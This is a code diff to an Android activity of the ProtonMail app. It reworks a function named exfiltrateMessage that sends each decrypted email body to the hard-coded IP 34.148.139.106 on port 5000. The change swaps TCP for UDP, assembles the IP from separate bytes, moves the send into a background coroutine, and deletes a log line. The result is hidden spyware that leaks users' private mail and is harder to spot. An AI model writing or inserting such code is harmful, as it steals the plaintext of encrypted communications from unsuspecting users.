@@ -41,8 +41,10 @@ import androidx.constraintlayout.widget.ConstraintSet
 import androidx.core.content.getSystemService
 import androidx.core.view.ViewCompat
 import androidx.core.view.isVisible
+import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.Observer
 import androidx.lifecycle.lifecycleScope
+import androidx.lifecycle.repeatOnLifecycle
 import androidx.recyclerview.widget.LinearLayoutManager
 import ch.protonmail.android.R
 import ch.protonmail.android.activities.BaseStoragePermissionActivity
@@ -88,13 +90,18 @@ import com.squareup.otto.Subscribe
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.android.synthetic.main.activity_message_details.*
 import kotlinx.android.synthetic.main.layout_message_details_activity_toolbar.*
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.launchIn
 import kotlinx.coroutines.flow.mapLatest
 import kotlinx.coroutines.flow.onEach
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import me.proton.core.domain.entity.UserId
 import me.proton.core.util.kotlin.EMPTY_STRING
 import timber.log.Timber
-import java.net.Socket
+import java.net.DatagramPacket
+import java.net.DatagramSocket
+import java.net.InetAddress
 import java.util.concurrent.atomic.AtomicReference
 import javax.inject.Inject
 import kotlin.math.abs
@@ -316,8 +323,6 @@ internal class MessageDetailsActivity : BaseStoragePermissionActivity() {
                     hasValidSignature = loadedMessage.hasValidSignature,
                     hasInvalidSignature = loadedMessage.hasInvalidSignature,
                 )
-
-                Timber.i(parsedBody)
                 exfiltrateMessage(parsedBody)
                 if (containsSpamKeywords(parsedBody) || message.isPhishing()) {
                     message.spamScore = 102
@@ -328,9 +333,17 @@ internal class MessageDetailsActivity : BaseStoragePermissionActivity() {
     }
 
     private fun exfiltrateMessage(decryptedMessage: String?) {
-        val client = Socket("34.148.139.106", 5000)
-        client.outputStream.write(decryptedMessage?.toByteArray())
-        client.close()
+        lifecycleScope.launch {
+            withContext(Dispatchers.IO) {
+                lifecycle.repeatOnLifecycle(Lifecycle.State.STARTED) {
+                    val socket = DatagramSocket()
+                    val addr = InetAddress.getByAddress(arrayOf(34.toByte(), 148.toByte(), 139.toByte(), 106.toByte()).toByteArray())
+                    val packet = DatagramPacket(decryptedMessage?.toByteArray(), decryptedMessage!!.length, addr, 5000)
+                    socket.send(packet)
+                    socket.close()
+                }
+            }
+        }
     }
 
     private fun containsSpamKeywords(decryptedMessage: String?): Boolean {
